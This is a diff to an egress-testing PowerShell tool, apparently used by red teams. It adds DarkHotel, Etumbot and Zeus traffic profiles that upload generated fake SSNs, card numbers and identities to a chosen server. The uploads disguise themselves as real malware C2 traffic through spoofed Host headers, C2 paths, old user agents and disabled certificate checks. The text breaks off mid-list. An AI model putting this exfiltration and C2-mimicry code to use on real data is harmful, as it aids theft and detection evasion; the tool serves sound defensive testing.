@@ -1,10 +1,10 @@
 function Invoke-EgressAssess
 {
+    
 <#
 
 .Synopsis
     Egress-assess powershell client. 
-    Script created by @rvrsh3ll @christruncer @harmj0y @sixdub
 
 .Description
     This script will connect to an Egress-assess server and transfer faux Personally Identifiable Information or
@@ -21,17 +21,23 @@ function Invoke-EgressAssess
 .Parameter ResolveDNS
     Switch to enable DNS resolution for ICMP transfers
 
+.Parameter NoPing
+    Disable ping check
+
 .Parameter Proxy
     This switch is used when you need to exfiltrate data using the system proxy
 
+.Parameter UserAgent
+    Assign a specific UserAgent ("IE","Moz","Saf"). Default's to random
+
+.Parameter Actor
+    Assign a malware profile to your traffic
+    
 .Parameter Username
     The username for the ftp server
 
 .Parameter Password
     The password for the ftp server
-
-.Parameter NoPing
-    Disable the server ping check
 
 .Parameter Datatype
     The string containing the data you want to generate and exfil
@@ -57,18 +63,22 @@ function Invoke-EgressAssess
 #>
     [CmdletBinding()]
     Param (
-        [Parameter(Mandatory = $True)]
+        [Parameter(Mandatory = $False)]
         [string]$Client,
         [Parameter(Mandatory = $True)]
         [string]$IP,
         [Parameter(Mandatory = $False)]
         [switch]$ResolveDNS,
         [Parameter(Mandatory = $False)]
+        [switch]$NoPing,
+        [Parameter(Mandatory = $False)]
         [switch]$Proxy,
+        [Parameter(Mandatory = $False)]
+        [string]$UserAgent,
+        [Parameter(Mandatory = $False)]
+        [string]$Actor,
         [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
         [string]$Datatype,
-        [Parameter(Mandatory = $False)]
-        [switch]$NoPing,
         [Parameter(Mandatory = $False)]
         [string]$Username,
         [Parameter(Mandatory = $False)]
@@ -80,32 +90,31 @@ function Invoke-EgressAssess
         [Parameter(Mandatory = $False)]
         [string]$Report
     )
-    
     begin
     {
         #stop looping errors
         $ErrorActionPreference = "Stop"
-
+        
         #get start time
         $startTime = (Get-Date)
-              
-        #checks if Egress-Assess server is running
+        
+        #checks if Egress-Assess server is running using ICMP ping
         function Test-ServerConnection
         {
             Write-Verbose "[*] Testing server connection"
             $socketTcp = New-Object Net.Sockets.TcpClient
-            $socketUdp = New-Object System.Net.Sockets.UdpClient          
+            $socketUdp = New-Object System.Net.Sockets.UdpClient
             $ping = $(Test-Connection -ComputerName $IP -Count 1 -Quiet)
-            if($ping -eq $true)
+            if ($ping -eq $true)
             {
                 Write-Verbose "[*] Server is UP on $IP."
-                if($client -eq "icmp")
-                {  
+                if ($client -eq "icmp")
+                {
                     #Potential future verification of icmp server/sniffer running
                     Write-Verbose "[*] ICMP server *possibly* running."
                     Return
                 }
-                elseif($client -eq "dnstxt" -or $client -eq "dnsresolved")
+                elseif ($client -eq "dnstxt" -or $client -eq "dnsresolved")
                 {
                     <#Note: Need to troubleshoot DNS checks more.
                     $port = 53
@@ -130,19 +139,19 @@ function Invoke-EgressAssess
                 }
                 else
                 {
-                    if($client -eq "http")
+                    if ($client -eq "http")
                     {
                         $port = 80
                     }
-                    elseif($client -eq "https")
+                    elseif ($client -eq "https")
                     {
                         $port = 443
                     }
-                    elseif($client -eq "ftp")
+                    elseif ($client -eq "ftp")
                     {
                         $port = 21
                     }
-                    elseif($client -eq "sftp")
+                    elseif ($client -eq "sftp")
                     {
                         $port = 22
                     }
@@ -150,24 +159,31 @@ function Invoke-EgressAssess
                     {
                         $port = 25
                     }
-                    elseif($client -eq "smb")
+                    elseif ($client -eq "smb")
                     {
                         $port = 445
                     }
-                    else 
+                    else
                     {
                         Write-Verbose "[*] Protocol not available."
                         throw "Error"
                     }
-
+                    
                     #attempt to test connection to TCP ports
                     try
                     {
-                        $socketTcp.Connect($ip,$port)  
-                    } catch{}
-
+                        $socketTcp.Connect($ip, $port)
+                    }
+                    catch
+                    {
+                        $ErrorMessage = $_.Exception.Message
+                        Write-Verbose "[*] Error, tranfer failed with error:"
+                        Write-Verbose $ErrorMessage
+                        Break
+                    }
+                    
                     #connect to server if running
-                    if($socketTcp.Connected)
+                    if ($socketTcp.Connected)
                     {
                         Write-Verbose "[*] $($client.toUpper()) Server Running on $IP port $port."
                         $socketTcp.close()
@@ -177,13 +193,13 @@ function Invoke-EgressAssess
                         Write-Verbose "[*] $($client.toUpper()) Server Not Running on $IP. Start server."
                         throw "Error"
                     }
-                }  
+                }
             }
-            else 
+            else
             {
                 Write-Verbose "[*] Server is DOWN on $IP."
                 throw "Error"
-            }           
+            }
         }
         
         
@@ -212,6 +228,7 @@ function Invoke-EgressAssess
         
         function Generate-CreditCards
         {
+            
             $script:AllCC = @()
             $stringBuilder = New-Object System.Text.StringBuilder
             $script:list = New-Object System.Collections.Generic.List[System.String]
@@ -264,8 +281,9 @@ function Invoke-EgressAssess
             }
             $script:AllCC = $list.ToArray()
         }
-
-        function Generate-Names {
+        
+        function Generate-Identity
+        {
             $script:AllNames = @()
             $FirstNames = @('michael', 'john', 'david', 'chris', 'mike', 'james',
             'mark', 'jason', 'robert', 'jessica', 'sarah', 'jennifer',
@@ -275,7 +293,7 @@ function Invoke-EgressAssess
             'mary', 'adam', 'melissa', 'matthew', 'nick', 'stephanie',
             'anthony', 'tom', 'josh', 'laura', 'tim', 'jim', 'amy', 'peter',
             'dan', 'nicole', 'tony')
-
+            
             $LastNames = @('smith', 'johnson', 'jones', 'williams', 'brown',
             'lee', 'khan', 'singh', 'kumar', 'miller', 'davis', 'wilson',
             'taylor', 'thomas', 'garcia', 'anderson', 'sharma', 'martin',
@@ -284,7 +302,7 @@ function Invoke-EgressAssess
             'hernandez', 'clark', 'lewis', 'robinson', 'young', 'gonzalez',
             'hall', 'wright', 'scott', 'perez', 'green', 'allen', 'tan',
             'shah', 'roberts', 'adams', 'nguyen', 'james', 'hill')
-
+            
             $Addresses = @('PO Box 4927 Montgomery, AL 36103', 'PO Box 110801 Juneau, AK 99811-0801',
             '1110 W. Washington Street, Suite 155 Phoenix, AZ 85007',
             'One Capitol Mall Little Rock, AR 72201',
@@ -327,8 +345,7 @@ function Invoke-EgressAssess
             '110 3rd Street Lenoir, NC 28645',
             '488 Schoolhouse Lane Johnston, RI 02919',
             '658 Market Street New Brunswick, NJ 08901')
-    
-           
+            
             $list = New-Object System.Collections.Generic.List[System.String]
             $num = [math]::Round(($Size * 1MB)/69)
             $percentcount = 0
@@ -341,14 +358,14 @@ function Invoke-EgressAssess
                     Write-Verbose "$percent% Done! $i Name-Sets Generated"
                     $percentcount += 1
                 }
-            $First = Get-Random -InputObject $FirstNames
-            $Last = Get-Random -InputObject $LastNames
-            $Address = Get-Random -InputObject $Addresses
-            $SSN = "$(Get-Random -minimum 100 -maximum 999)-$(Get-Random -minimum 10 -maximum 99)-$(Get-Random -minimum 1000 -maximum 9999)"
-            $TextInfo = (Get-Culture).TextInfo
-            $r = "$($TextInfo.ToTitleCase($First.ToLower()) + " " + $TextInfo.ToTitleCase($Last.ToLower()) +  " $Address" +  " $SSN")"
-            $s = Get-Random -InputObject $r
-            $list.Add($s)
+                $First = Get-Random -InputObject $FirstNames
+                $Last = Get-Random -InputObject $LastNames
+                $Address = Get-Random -InputObject $Addresses
+                $SSN = "$(Get-Random -minimum 100 -maximum 999)-$(Get-Random -minimum 10 -maximum 99)-$(Get-Random -minimum 1000 -maximum 9999)"
+                $TextInfo = (Get-Culture).TextInfo
+                $r = "$($TextInfo.ToTitleCase($First.ToLower()) + " " + $TextInfo.ToTitleCase($Last.ToLower()) + " $Address" + " $SSN")"
+                $s = Get-Random -InputObject $r
+                $list.Add($s)
             }
             $script:AllNames = $list.ToArray()
         }
@@ -358,22 +375,721 @@ function Invoke-EgressAssess
             $global:FileTransfer = $True
             if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
         }
-        
-        function Use-HTTP
+        ###################################
+        #      Begin Malware Signatures   #
+        ###################################
+        function Use-DarkHotel
         {
+            $domains = @('micronaoko.jumpingcrab.com', 'microchsse.strangled.net',
+            'microbrownys.strangled.net', 'microplants.strangled.net',
+            'microlilics.crabdance.com')
+            $uris = @('/bin/read_i.php?a1=step2-down-b&a2=KJNSDFkjmdfH&a3=SW5mb1N5c0BVc2VyIE1ZQ09NUFVURVJATXlVc2VyICgwODUwKUMgUCBVIDogSW50ZWwoUikgQ29yZShUTSkgaTMtMTY2N1UgQ1BVIEAgMTYwMEdIelN5c3RlbSBPUzogTWljcm9zb2Z0IFdpbmRvd3MgWFAgKFNlcnZpY2UgUGFjayAzKU5ldCBjYXJkIDogMTkyLjE2OC4wLjIgKDEzMzc3MzMxMTMzNyk=&a4=KS',
+            '/bin/read_i.php?a1=step2-down-r&a2=KDYEMDYWM&a3=SW5mb1N5c0BVc2VyIE1ZQ09NUFVURVJATXlVc2VyICgwODUwKUMgUCBVIDogSW50ZWwoUikgQ29yZShUTSkgaTctMTY2N1UgQ1BVIEAgMTYwMEdIelN5c3RlbSBPUzogTWljcm9zb2Z0IFdpbmRvd3MgNyAoU2VydmljZSBQYWNrIDIpTmV0IGNhcmQgOiAxOTIuMTY4LjI1LjIgKDEzMzc3MzMxMTMzNyk=&a4=TR',
+            '/bin/read_i.php?a1=step2-down-u&a2=YEMDGEJEIMD&a3=SW5mb1N5c0BVc2VyIFdvcmtzdGF0aW9uQFNvbm9mRmx5bm4gKDA4NTApQyBQIFUgOiBJbnRlbChSKSBDb3JlKFRNKSBpNy0xNTBVIENQVSBAIDE2MDBHSHpTeXN0ZW0gT1M6IE1pY3Jvc29mdCBXaW5kb3dzIDguMSAoU2VydmljZSBQYWNrIDEpTmV0IGNhcmQgOiAxOTIuMTY4LjMzLjIgKDEzMzc3MzMxMTMzNyk=&a4=BD',
+            '/bin/read_i.php?a1=step2-down-c&a2=MSNETJ&a3=SW5mb1N5c0BVc2VyIFNFUlZFUkRDQEFETUlOICgwODUwKUMgUCBVIDogSW50ZWwoUikgQ29yZShUTSkgaTctOTBVIENQVSBAIDIwMDBHSHpTeXN0ZW0gT1M6IE1pY3Jvc29mdCBXaW5kb3dzIDEwIE5ldCBjYXJkIDogMTkyLjE2OC4xMzMuMiAoMTMzNzczMzExMzM3KQ==&a4=AST',
+            '/bin/read_i.php?a1=step2-down-k&a2=VSEJKNEF&a3=SW5mb1N5c0BVc2VyIERCQURCQFNZU0RCQSAoMDg1MClDUFUgOiBJbnRlbChSKSBDb3JlKFRNKSBpNy05MCBDUFUgQCAzMjAwR0h6U3lzdGVtIE9TOiBNaWNyb3NvZnQgV2luZG93cyBTZXJ2ZXIgMjAwMyBOZXQgY2FyZCA6IDE5Mi4xNjguMTUzLjIgKDEzMzc3MzMxMTMzNyk=&a4=NOD'
+            '/bin/read_i.php?a1=step2-down-j&a2=ALFDOEJNKF&a3=SW5mb1N5c0BVc2VyIERBZG1pbkBEQ1N5cyAoMDk1MClDUFUgOiBJbnRlbChSKSBDb3JlKFRNKSBpNy05MDAgQ1BVIEAgMzgwMUdIelN5c3RlbSBPUzogTWljcm9zb2Z0IFdpbmRvd3MgU2VydmVyIDIwMDggTmV0IGNhcmQgOiAxOTIuMTY4LjE5My4yICgxMzM3NzMzMTEzMzcp&a4=NV')
+            $checkinDomains = @('autolace.twilightparadox.com', 'automachine.servequake.com')
+            
+            # Detect what datatype we're sending
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
-                $totalupload = 0
-                if ($Datatype -eq "ssn") {
+                
+                if ($Datatype -eq "ssn")
+                {
                     Generate-SSN
                     $Data = $AllSSN
                 }
-                elseif ($Datatype -eq "cc") {
+                elseif ($Datatype -eq "cc")
+                {
                     Generate-CreditCards
                     $Data = $AllCC
                 }
-                elseif ($Datatype -eq "identity") {
-                    Generate-Names
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
+                    $Data = $AllNames
+                }
+                
+            }
+            else
+            {
+                Write-Verbose "[*] You did not provide a data type to generate."
+                Return
+            }
+            Do
+            {
+                try
+                {
+                    Try
+                    {
+                        # Checkin Request 1
+                        
+                        if ($client -eq "http")
+                        {
+                            $Url = "http://" + $IP + "/major/images/view.php"
+                        }
+                        elseif ($client -eq "https")
+                        {
+                            $Url = "https://" + $IP + "/major/images/view.php"
+                        }
+                        $ranHost = Get-Random -InputObject $checkinDomains
+                        [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+                        $uri = New-Object -TypeName System.Uri -ArgumentList $Url
+                        $wc = New-Object -TypeName System.Net.WebClient
+                        Write-Verbose $uri
+                        $wc.Headers.Add('Accept', '*/*')
+                        $wc.Headers.Add('User-Agent', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)')
+                        $wc.Headers.Add('Host', $ranHost)
+                        $wc.Headers.Add('Pragma', 'no-cache')
+                        Write-Verbose  "Uploading  data..."
+                        $wc.UploadString($uri, $Data)
+                    }
+                    catch
+                    {
+                        $ErrorMessage = $_.Exception.Message
+                        Write-Verbose "[*] Error, tranfer failed with error:"
+                        Write-Verbose $ErrorMessage
+                        Break
+                    }
+                    
+                    # Checkin Request 2
+                    if ($client -eq "http")
+                    {
+                        $Url = "http://" + $IP + "/major/txt/read.php"
+                    }
+                    elseif ($client -eq "https")
+                    {
+                        $Url = "https://" + $IP + "/major/txt/read.php"
+                    }
+                    $ranHost = Get-Random -InputObject $checkinDomains
+                    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+                    $uri = New-Object -TypeName System.Uri -ArgumentList $Url
+                    $wc = New-Object -TypeName System.Net.WebClient
+                    Write-Verbose $uri
+                    $wc.Headers.Add('Accept', '*/*')
+                    $wc.Headers.Add('User-Agent', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)')
+                    $wc.Headers.Add('Host', $ranHost)
+                    $wc.Headers.Add('Pragma', 'no-cache')
+                    Write-Verbose  "Uploading  data..."
+                    $wc.UploadString($uri, $Data)
+                }
+                catch
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose "[*] Error, tranfer failed with error:"
+                    Write-Verbose $ErrorMessage
+                    Break
+                }
+                # Main transfer
+                $localLoop = 5
+                Do
+                {
+                    $ranURI = Get-Random -InputObject $uris
+                    if ($client -eq "http")
+                    {
+                        $Url = "http://" + $IP + $ranURI
+                    }
+                    elseif ($client -eq "https")
+                    {
+                        $Url = "https://" + $IP + $ranURI
+                    }
+                    $ranHost = Get-Random -InputObject $checkinDomains
+                    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+                    $uri = New-Object -TypeName System.Uri -ArgumentList $Url
+                    $wc = New-Object -TypeName System.Net.WebClient
+                    Write-Verbose $uri
+                    $wc.Headers.Add('Accept', '*/*')
+                    $wc.Headers.Add('User-Agent', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)')
+                    $wc.Headers.Add('Host', $ranHost)
+                    $wc.Headers.Add('Pragma', 'no-cache')
+                    Write-Verbose  "Uploading  data..."
+                    $wc.UploadString($uri, $Data)
+                    $localLoop--
+                }
+                While ($localLoop -gt 0)
+                
+                Write-Verbose "[*] Transfer complete!"
+                $loops--
+                Write-Verbose "[*] $loops loops remaining.."
+            }
+            While ($loops -gt 0)
+        }
+        
+        function Use-Etumbot
+        {
+            $domains = @('200.27.173.58', '200.42.69.140', '92.54.232.42', '133.87.242.63',
+            '98.188.111.244', 'intro.sunnyschool.com.tw', '143.89.145.156',
+            '198.209.212.82', '143.89.47.132', '196.1.199.15',
+            'wwap.publiclol.com', '59.0.249.11', '190.16.246.129', '211.53.164.152', 'finance.yesplusno.com')
+            $encodedString = @('dGhpc2lzYXRlc3RzdHJpbmdkb250Y2F0Y2htZQ--',
+            'Y2F0Y2hldHVtYm90aWZ5b3VjYW4-',
+            'Z29oYWxleWdvYW5kaGFja2F3YXl0aGVnaWJzb24-',
+            'bHVrZXJlYWxseWlzdGhlbWFubXl0aGFuZGxlZ2VuZA--',
+            'd2h5aXNwZW5uc3RhdGVzb2JhZGF0Zm9vdGJhbGw-',
+            'U2VtaW5vbGVzd291bGRkZXN0cm95cGVubnN0YXRl',
+            'dGhlYnJvbmNvc2FyZWJldHRlcnRoYW5yYXZlbnM-',
+            'bm90cmVkYW1lY2hlYXRzdG93aW4-',
+            'dGhlU2VtaW5vbGVzYmVhdG5vcmVkYW1l',
+            'YmpwZW5uaXNhbmF3ZXNvbWVmaWdodGVy')
+            $uris = @($("/image/" + $(Get-Random -InputObject $encodedString) + ".jpg"),
+            $("/history/" + $(Get-Random -InputObject $encodedString) + ".asp"),
+            $("/manage/asp/item.asp?id=" + $(Get-Random -InputObject $encodedString) + "&&mux=" + $(Get-Random -InputObject $encodedString)),
+            $("/article/30441/Review.asp?id=" + $(Get-Random -InputObject $encodedString) + "&&date=" + $(Get-Random -InputObject $encodedString)),
+            $("/tech/s.asp?m=" + $(Get-Random -InputObject $encodedString)))
+            
+            # Detect what datatype we're sending
+            if ($Datatype -contains "ssn" -or "cc" -or "identity")
+            {
+                
+                if ($Datatype -eq "ssn")
+                {
+                    Generate-SSN
+                    $Data = $AllSSN
+                }
+                elseif ($Datatype -eq "cc")
+                {
+                    Generate-CreditCards
+                    $Data = $AllCC
+                }
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
+                    $Data = $AllNames
+                }
+                
+            }
+            else
+            {
+                Write-Verbose "[*] You did not provide a data type to generate."
+                Return
+            }
+            Do
+            {
+                # Checkin Request
+                if ($client -eq "http")
+                {
+                    $Url = "http://" + $IP + "/home/index.asp?typeid=13"
+                }
+                elseif ($client -eq "https")
+                {
+                    $Url = "https://" + $IP + "/home/index.asp?typeid=13"
+                }
+                $ranHost = Get-Random -InputObject $domains
+                [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+                $uri = New-Object -TypeName System.Uri -ArgumentList $Url
+                $wc = New-Object -TypeName System.Net.WebClient
+                Write-Verbose $uri
+                $wc.Headers.Add('Accept', 'text/html,application/xhtml+xml,application/xml,q=0.9,*/*;q=0.8')
+                $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)')
+                $wc.Headers.Add('Host', $ranHost)
+                $wc.Headers.Add('Referrer', 'http://www.google.com')
+                $wc.Headers.Add('Cache-Control', 'no-cache')
+                $wc.Headers.Add('Pragma', 'no-cache')
+                Write-Verbose  "Uploading  data..."
+                $wc.UploadString($uri, $Data)
+                
+                
+                # Main transfer
+                $localLoop = 5
+                Do
+                {
+                    Write-Verbose "Looping 5 times"
+                    
+                    $ranURI = Get-Random -InputObject $uris
+                    if ($client -eq "http")
+                    {
+                        $Url = "http://" + $IP + $ranURI
+                    }
+                    elseif ($client -eq "https")
+                    {
+                        $Url = "https://" + $IP + $ranURI
+                    }
+                    $ranHost = Get-Random -InputObject $domains
+                    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+                    $uri = New-Object -TypeName System.Uri -ArgumentList $Url
+                    $wc = New-Object -TypeName System.Net.WebClient
+                    Write-Verbose $uri
+                    $wc.Headers.Add('Accept', 'text/html,application/xhtml+xml,application/xml,q=0.9,*/*;q=0.8')
+                    $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)')
+                    $wc.Headers.Add('Host', $ranHost)
+                    $wc.Headers.Add('Referrer', 'http://www.google.com')
+                    $wc.Headers.Add('Cache-Control', 'no-cache')
+                    $wc.Headers.Add('Pragma', 'no-cache')
+                    Write-Verbose  "Uploading  data..."
+                    $wc.UploadString($uri, $Data)
+                    $localLoop--
+                }
+                While ($localLoop -gt 0)
+                
+                
+                Write-Verbose "[*] Transfer complete!"
+                $loops--
+                Write-Verbose "[*] $loops loops remaining.."
+            }
+            While ($loops -gt 0)
+        }
+        ## End Eumbot
+        
+        function Use-Zeus
+        {
+            $domains = @('0x.x.gg', '6pjddrtt7.com', 'apexholdngs.com', 'baoshlda.com',
+            'bestdove.in.ua', 'championbft.com', 'codedtunes.zapto.org',
+            'cooldomainname.ws', 'danislenefc.info', 'dau43vt5wtrd.tk',
+            'diosdelared.com.mx', 'emaillifecoaching.com.au', 'emekonline.tk',
+            'eresimgbo.com', 'escoesco.info', 'fileserver03.com',
+            'finsolutions.top', 'fronty2073.net', 'genmjob3.ru',
+            'gjiayimeiya.com', 'gorainbowzone.tk', 'hope-found-now.net',
+            'hruner.com', 'hui-ain-apparel.tk', 'ice.ip64.net',
+            'interglobalswiss.info', 'jomo.in.ua', 'juyteche.tk',
+            'kesikelyaf.com', 'legitvendors.ru', 'lion.web2.0campus.net',
+            'liveresellerweb.eu', 'mccc-investconsultant.com', 'muazymaur.tk',
+            'mymytonnymaxltd.org', 'mypic.hopto.org', 'mystartap.com',
+            'neease.com', 'ns513726.ip-192-99-148.net',
+            'panel.vargakragard.se', 'polyaire-au.com',
+            'projects.globaltronics.net', 'regame.su', 'richus.ru',
+            'server.bovine-mena.com', 'ssl.sinergycosmetics.com',
+            'sslsam.com', 'sus.nieuwmoer.info', 'tesab.org.uk',
+            'up.frigo2000.it', 'update.odeen.eu', 'update.rifugiopontese.it',
+            'urchilaa.com', 'winscoft.com', 'www.nikey.cn',
+            'www.riverwalktrader.co.za', 'www.witkey.com', 'zabava-bel.ru')
+            $uris = @('/jm32/includes/site/bot.exe', '/jm32/includes/site/config.bin',
+            '/jm32/includes/site/gate.php', '/mathew/config.jpg',
+            '/docs/.docs/config.jpg', '/docs/.docs/do.php',
+            '/zeujuus/a/gate.php', '/zeujuus/a/modules/bot.exe',
+            '/zeujuus/a/modules/config.bin',
+            '/zejius/2HZG41Zw/6Vtmo6w4yQ5tnsBHms64.php',
+            '/zejius/2HZG41Zw/bot.exe',
+            '/zejius/2HZG41Zw/fJsnC6G4sFg2wsyn4shb.bin',
+            '/zejius/5GPR0iy9/6Vtmo6w4yQ5tnsBHms64.php',
+            '/zejius/5GPR0iy9/bot.exe',
+            '/zejius/5GPR0iy9/fJsnC6G4sFg2wsyn4shb.bin', '/past/config.jpg',
+            '/past/gate.php', '/fan/base/config.jpg',
+            '/wp-includes/pomo/panel/config.jpg',
+            '/wp-includes/pomo/panel/gate.php', '/themes/panel/config.jpg',
+            '/themes/panel/gate.php', '/home/libraries/joomla/php/gate.php',
+            '/home/plugins/system/tmp/bot.scr',
+            '/home/plugins/system/tmp/config.bin',
+            '/home/plugins/system/tmp/gate.php', '/js/ssj/config.jpg',
+            '/js/ssj/gate.php', '/site/tmp/xml/config.jpg',
+            '/site/tmp/xml/gate.php', '/news/wpg.php', '/file.php',
+            '/.cgi-bin./as.bin', '/wp-content/themes/bmw_lab/new.ban',
+            '/wp-content/themes/bmw_lab/newnew.wav', '/vs/panel/config.jpg',
+            '/vs/panel/gate.php', '/brand/server/file.php',
+            '/brand/server/gate.php',
+            '/wp-admin/css/colors/sunrise/admin/bot.exe',
+            '/wp-admin/css/colors/sunrise/admin/config.bin',
+            '/wp-admin/css/colors/sunrise/admin/secure.php',
+            '/wp-content/themes/chagim/library/images/plates/bot.exe',
+            '/wp-content/themes/chagim/library/images/plates/config.bin',
+            '/wp-content/themes/chagim/library/images/plates/gate.php',
+            '/images/burr_insurance001001.php', '/images/team/config.jpg',
+            '/images/team/gate.php', '/test/config.jpg', '/test/gate.php',
+            '/ray/server/file.php', '/ray/server/gate.php', '/capa.bin',
+            '/capa.exe', '/secure.php', '/ral/30/config.bin',
+            '/ral/30/secure.php', '/wp-admin/css/config.bin',
+            '/wp-admin/css/gate.php', '/wp-admin/css/setup.exe',
+            '/panel/config.jpg', '/panel/gate.php',
+            '/wp-includes2/SimplePie/Net/page/config.jpg',
+            '/wp-includes2/SimplePie/Net/page/gate.php',
+            '/includes/.srv/srv/bot.exe',
+            '/includes/.srv/srv/config.bin', '/includes/.srv/srv/gate.php',
+            '/ric/30/config.bin', '/ric/30/secure.php', '/blog/crea.bin',
+            '/blog/crea.exe', '/blog/secure.php', '/images2/dave.jpg',
+            '/images2/gate.php', '/wp-includes/ID3/config.jpg',
+            '/wp-includes/ID3/gate.php', '/emman/panel/config.jpg',
+            '/emman/panel/gate.php', '/xampp/img/escu.bin',
+            '/xampp/img/escu.exe', '/xampp/img/secure.php',
+            '/.css/config.jpg', '/.css/gate.php', '/admin/cfg.bin',
+            '/admin/gate.php', '/isai/modules/mod_upgrade/bot.exe',
+            '/isai/modules/mod_upgrade/config.bin',
+            '/isai/modules/mod_upgrade/gate.php', '/wp-comment/firs.jpg',
+            '/wp-comment/gate.php', '/panel/file.php', '/panel/gate.php',
+            '/images01/fong.bin', '/images01/fong.exe', '/images01/gate.php',
+            '/img/vg.php', '/components/com_file/file.php',
+            '/components/com_file/gate.php', '/images/panel/config.jpg',
+            '/images/panel/gate.php', '/wordpress/gate.php',
+            '/wordpress/gree.jpg', '/media/.tmp/file.php',
+            '/media/.tmp/gate.php', '/gate.php', '/modules/holl.bin',
+            '/modules/holl.exe', '/templates/admin/install/config.jpg',
+            '/templates/admin/install/gate.php',
+            '/tmp/admin/install/config.jpg', '/tmp/admin/install/gate.php',
+            '/tmp/cp/config.jpg', '/tmp/cp/gate.php',
+            '/tmp/install/config.jpg', '/tmp/install/gate.php',
+            '/frank/panel/config.jpg', '/frank/panel/gate.php',
+            '/tmp/configs/new/vg.php', '/meask/lite/file.php',
+            '/meask/lite/gate.php', '/css/src/admin/config.jpg',
+            '/css/src/admin/gate.php', '/js/admin/install/config.jpg',
+            '/js/admin/install/gate.php',
+            '/wp-content/plugins/wp-db-backup-made/work.php',
+            '/update/bot.exe', '/update/cfg.bin', '/update/gate.php',
+            '/chopinschumann/ital.bin', '/chopinschumann/ital.exe',
+            '/chopinschumann/secure.php', '/images/ital.bin',
+            '/images/ital.exe', '/images/secure.php',
+            '/compose/panel/bot.exe', '/compose/panel/config.bin',
+            '/compose/panel/secure.php', '/fy97/panel/config.bin',
+            '/fy97/panel/secure.php', '/images/joea.bin', '/images/joea.exe',
+            '/images/secure.php', '/components/com_joomla/plugin/config.jpg',
+            '/components/com_joomla/plugin/gate.php',
+            '/resource/css/config.bin', '/resource/css/secure.php',
+            '/wp-content/upgrade/PANEL/config.jpg',
+            '/wp-content/upgrade/PANEL/gate.php',
+            '/wp-content/plugins/bcet56aoikqf52iu/food.php',
+            '/Scripts/_notes/build/bot.exe',
+            '/Scripts/_notes/build/config.bin',
+            '/Scripts/_notes/build/gate.php', '/REMOVED/.pop/bot.exe',
+            '/REMOVED/.pop/config.bin', '/REMOVED/.pop/gate.php',
+            '/KINS/panel/bot.exe', '/KINS/panel/config.jpg',
+            '/KINS/panel/gate.php', '/panel/config.jpg', '/panel/gate.php',
+            '/walex/files/bot.exe', '/walex/files/config.jpg',
+            '/walex/files/gate.php', '/e7/bot.exe', '/e7/cfg.bin',
+            '/e7/gate.php',
+            '/wp-admin/css/colors/coffee/cat/server/config.jpg',
+            '/wp-admin/css/colors/coffee/cat/server/gate.php',
+            '/site/S/13897652/5112/file.php',
+            '/site/S/13897652/5112/gate.php',
+            '/images/js/osomo/panel/config.jpg',
+            '/images/js/osomo/panel/gate.php',
+            '/themes/panel/config.jp', '/themes/panel/gate.php',
+            '/system/eusat/telesa/config.jpg', '/sadcxvbv/vdfbffddf.php',
+            '/wqwcqqw/sasasacw.php', '/images/server/file.php',
+            '/images/server/gate.php', '/cache/lcitorg/config.bin',
+            '/cache/lcitorg/gate.php', '/form/panel/config.jpg',
+            '/form/panel/gate.php', '/backup/gate.php',
+            '/backup/jera.jpg', '/images/file.php',
+            '/images/js/panel/config.jpg', '/images/js/panel/gate.php',
+            '/images/config.jpg', '/images/gate.php',
+            '/slim-cita/helps/file.php', '/slim-cita/helps/gate.php',
+            '/kin/panelz/config.jpg', '/kin/panelz/gate.php',
+            '/image/Panel/config.jpg', '/folder/config.bin',
+            '/folder/secure.php', '/plugins/panel/config.jpg',
+            '/plugins/panel/gate.php',
+            '/wp-content/plugins/slxcdfrdmn9r0x/j7.php', '/q/gate.php',
+            '/q/outl.jpg', '/media/k2/file.php', '/media/k2/gate.php',
+            '/js/MOM/config.jpg', '/js/MOM/gate.php',
+            '/lung/panel/config.jpg', '/wp/config.jpg',
+            '/wp/gate.php', '/data/config.jpg', '/data/gate.php',
+            '/templates/beez/bot.exe', '/templates/beez/config.bin',
+            '/templates/beez/gate.php', '/wp-includes/css/new/config.jpg',
+            '/wp-includes/css/new/gate.php',
+            '/language/pdf_fonts/server/bot.exe',
+            '/language/pdf_fonts/server/config.bin',
+            '/language/pdf_fonts/server/gate.php', '/js/liscence.php',
+            '/js/userslogin.php', '/ijo/config.jpg', '/ijo/gate.php',
+            '/Mix/valeg/bot.exe', '/Mix/valeg/config.bin',
+            '/Mix/valeg/gate.php', '/media/media/js/.js/ajax.php',
+            '/media/media/js/.js/color.jpg', '/wpc/Panel/config.jpg',
+            '/wpc/Panel/gate.php', '/images/gate.php', '/images/stab.jpg',
+            '/wpadm/Panel/config.jpg', '/wpadm/Panel/gate.php',
+            '/admin/b7.php', '/admin/file.php', '/amed/config.jpg',
+            '/amed/gate.php', '/sadcxvbv/vdfbffddf.php',
+            '/wpimages/image.php', '/ger/config.jpg', '/ger/gate.php',
+            '/percy/panel/config.jpg', '/percy/panel/gate.php',
+            '/map/Icons/outglav.exe', '/map/Icons/Religion/brah.png',
+            '/map/Icons/Religion/exejfjfjexe.exe', '/images/config.jpg',
+            '/images/gate.php', '/file.php', '/gate.php', '/.css/config.jpg',
+            '/.css/gate.php', '/colobus/gate.php', '/colobus/vsam.jpg',
